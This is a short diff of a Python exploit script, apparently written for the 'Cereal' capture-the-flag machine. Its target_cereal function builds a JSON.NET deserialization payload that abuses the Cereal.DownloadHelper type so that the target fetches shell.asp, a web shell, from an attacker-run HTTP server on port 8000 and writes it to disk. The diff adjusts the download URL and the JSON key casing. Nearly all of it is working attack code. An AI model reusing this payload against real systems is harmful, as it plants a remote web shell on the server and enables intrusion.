@@ -33,10 +33,10 @@ def target_cereal(ip, base_url, base_headers):
     
     print("\n=== POSTING TARGET CEREAL ===\n")
     
-    download_url = "https://{}/shell.asp".format(ip)
+    download_url = "http://{}:8000/shell.asp".format(ip)
     print("Creating target cereal, which will download from URL {} when deserialised".format(download_url))
 
-    target_json_string = "{\"JSON\":\"{\\\"$type\\\":\\\"Cereal.DownloadHelper, Cereal\\\",\\\"URL\\\": \\\"" + download_url +  "\\\",\\\"FilePath\\\":\\\"shell.asp\\\"}\"}"
+    target_json_string = "{\"json\":\"{\\\"$type\\\":\\\"Cereal.DownloadHelper, Cereal\\\",\\\"URL\\\":\\\"" + download_url +  "\\\",\\\"FilePath\\\":\\\"shell.asp\\\"}\"}"
     
     print("JSON submitted: " + target_json_string)
 
